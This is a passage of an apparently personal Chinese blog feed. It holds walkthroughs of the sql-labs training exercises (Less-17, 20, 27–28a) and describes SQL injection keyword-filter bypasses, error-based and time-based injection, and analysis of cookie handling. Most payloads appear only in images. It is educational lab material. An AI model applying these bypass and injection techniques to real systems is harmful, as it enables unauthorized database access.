src="/img/sql-labs23-28/27.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/28.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这关对关键字union和select有过滤</p><p>复写union，三写select或者大小写混合即可解决</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/30.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里id被单引号包裹</p><p>爆库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/31.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/32.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/33.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><p>这关没有报错信息，输入id=1’ </p><p><img src="/img/sql-labs23-28/34.png" alt=""></p><p>输入正确结果，因为id为int类型，所以说明id可能被双引号包裹</p><p>输入id=1” </p><p><img src="/img/sql-labs23-28/35.png" alt=""></p><p>查询不到结果，说明被双引号包裹</p><p>这关跟上一关一样，对关键字union和select进行了过滤，因为没有报错信息，所以不能用报错注入</p><p>联合注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/36.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/37.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/38.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>Id被(‘’)包裹，这关没有报错信息，所以用联合注入 </p><p><img src="/img/sql-labs23-28/39.png" alt=""></p><p>发现union和select 同时使用时就会被过滤掉，而且无视大小写 </p><p><img src="/img/sql-labs23-28/40.png" alt=""></p><p>这里解决方法是复写union\sselect </p><p><img src="/img/sql-labs23-28/41.png" alt=""></p><h3 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs23-28/42.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这关只对union\sselect进行了过滤，无报错信息</p><p>复写+联合注入就解决了</p>]]></content>
    
    <summary type="html">
    
      sql-labs23-28
    
    </summary>
    
      <category term="sql-labs" scheme="https://Foxgrin.github.io/categories/sql-labs/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>sql-labs20</title>
    <link href="https://Foxgrin.github.io//posts/47662/"/>
    <id>https://Foxgrin.github.io//posts/47662/</id>
    <published>2018-07-08T12:17:00.000Z</published>
    <updated>2018-07-09T13:33:44.948Z</updated>
    
    <content type="html"><![CDATA[<p>sql-labs20通关记录<a id="more"></a></p><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>今天的靶场是Less-20,这关涉及cookie,要深入理解的话我们就一行行分析源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>首先，来到程序的第一个分支点，$_COOKIE这个变量是能获取到报文头部所包含的cookie字段其中的信息，我们可以分析出如果要执行这个if语句，则cookie的’uname’字段中是没有信息的。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么网页首先显示的是跟前几个关卡相似的登录页面。<br>接下来来到第一个分支点里的又一个分支点</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出当我们在网页中的表单中提交用户名和账号信息时，则开始执行这个if语句</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>就开始查询数据库里的用户名和密码信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>并且将查询结果的’username’字段中的用户名信息赋值给$cookee</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>如果查询结果不为空</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>则设置将cookie中设置名为’uname’的字段，并给该字段赋值$cookee变量的值，也就是之前查询到的用户名信息，并且设置该字段的生存时间<br>如果查询结果为空，则返回一个查询失败的信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>也就是说当我们在网页的表单中输入用户名和密码时，当查询结果不为空时，则在cookie中设置字段值<br>我们用burp抓包看看报文的详细信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们先查询一下users表里的信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>接着输入一个users表中存在的用户名和密码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这是我们提交表单给服务器的POST报文，来看看服务器这时返回的信息是什么</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出服务器设置了cookie信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>并且返回这些信息，可见这就是一开始的登录页面加上</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>查询结果后返回的信息<br>那么我们放行这个请求报文，看看接下来发生什么</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>放行后出现了第二个请求报文，这是个GET请求报文，我们可以看出此时头部已经有了cookie信息，我们再来看看服务器的回应</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们再回头看看源代码，发现此时执行了第二个节点，此时cookie中的’uname’字段已经有了信息，则执行了else语句<br>这个else语句中又包含了一个节点</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>也就是当我们还未点击submit按钮时会执行这个if语句</p><p>然后</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>返回一些信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>并且以cookee变量的值作为用户名进行数据库的查询<br>然后将查询到的信息输出出来，最后一行会出现一个submit按钮<br>接下来我们放行第二个报文</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>放行后可以看到网页发生了变化，也就是返回了还未提交submit时的信息<br>我们点击一下submit按钮，这时看看请求的报文格式</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出这是一个POST请求报文，这时还又cookie信息，我们再来看看服务器返回的报文</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这时服务器发现cookie中的’expires’字段中的时间发生了变化，’uname’字段内容为空时，默认内容为deleted，并且返回</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可见当我们点击submit按钮后执行了else语句</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>放行这个POST请求报文</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>又出现了一个GET请求报文，看出此时cookie信息已经被删除了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs20/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>又回到了一开始的登录界面<br>这里就涉及了一个重定向“location”它的作用是不用用户输入网址，它会自动访问，一般是GET请求，所以我们之前能抓到两个请求报文，且网页最后显示是重定向后的最终页面</p>]]></content>
    
    <summary type="html">
    
      sql-labs20
    
    </summary>
    
      <category term="sql-labs" scheme="https://Foxgrin.github.io/categories/sql-labs/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>sql-labs17</title>
    <link href="https://Foxgrin.github.io//posts/34927/"/>
    <id>https://Foxgrin.github.io//posts/34927/</id>
    <published>2018-07-08T12:06:00.000Z</published>
    <updated>2018-07-09T13:33:44.947Z</updated>
    
    <content type="html"><![CDATA[<p>sql-labs17通关记录<a id="more"></a></p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs17/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>首先了解到本关是可以改密码，看一下源代码 </p><p><img src="/img/sql-labs17/2.png" alt=""></p><p>同样是接收我们输入的username和password，但是这里定义了一个check_input函数 </p><p><img src="/img/sql-labs17/3.png" alt=""></p><p>一步步分析这个函数 </p><p><img src="/img/sql-labs17/4.png" alt=""></p><p>首先empty这个函数，如果输入值不为空，则返回是false，输入为空，返回true</p><p>我们输入的是一个字符串，判断为空的情况的字符串为“”和“0”，所以要执行if语句，则empty返回false，所以输入字符串不为“”和“0”时，截取字符串前十五位</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs17/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这两个if语句就起到了对输入特殊字符的转义的作用，get_magic_quotes_gpc()这个函数当系统有对特定字符转义时返回true，没有返回false，当有转义时，执行if语句，stripslashes()函数将转义字符丢弃，ctype_digit()函数判断当字符串值不为0或者正整数时返回false，则会将输入的字符串加上’’并且对特殊字符转义 </p><p>我们首先先输入两个admin，可以看到提示修改密码成功，再看一下result.txt里面输入的值 </p><p><img src="/img/sql-labs17/6.png" alt=""></p><p>可以发现我们输入admin这个字符串两边被加了单引号，我们试试用户名admin’ </p><p><img src="/img/sql-labs17/7.png" alt=""></p><p>提示错误，说明查询结果为空，从txt文件可以看到 </p><p><img src="/img/sql-labs17/8.png" alt=""></p><p>对我们输入的’进行了转义，说明username无法进行一个注入，我们再试着在用户名输入0 </p><p><img src="/img/sql-labs17/9.png" alt=""></p><p>发现修改成功 </p><p><img src="/img/sql-labs17/10.png" alt=""></p><p>从txt文件 </p><p><img src="/img/sql-labs17/11.png" alt=""></p><p>看出输入字符串为0所以没有加单引号所以这题的注入点应该是password，我们先试试</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs17/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>果然出现了报错信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs17/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>没有报错，说明password被单引号包裹,我们来试试基于报错型的注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs17/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>结果显示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs17/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再试试基于时间的报错型注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs17/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>按理来说应该会sleep 13秒，因为没有指定修改条件，会一行行的修改，而users表里有十三行，所以修改十三次。</p><p>但从结果来看并没有sleep</p><p>这是为什么呢，这个问题我也想了好久好久，最终学长点醒了我，原来是and的优先级大于=，所以先执行’admin’ and if()语句，而字符串里没有数字时是无法做and运算的，就无法执行后面的if语句</p><p>我们试着把密码加一个数字</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs17/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>果然结果sleep了13秒，学长建议通过where后的条件进行注入以免意外的错误</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs17/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>于是我们开始爆表名</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs17/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs17/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列名</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs17/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs17/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆数据</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs17/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs17/24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      sql-labs17
    
    </summary>
    
      <category term="sql-labs" scheme="https://Foxgrin.github.io/categories/sql-labs/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
</feed>
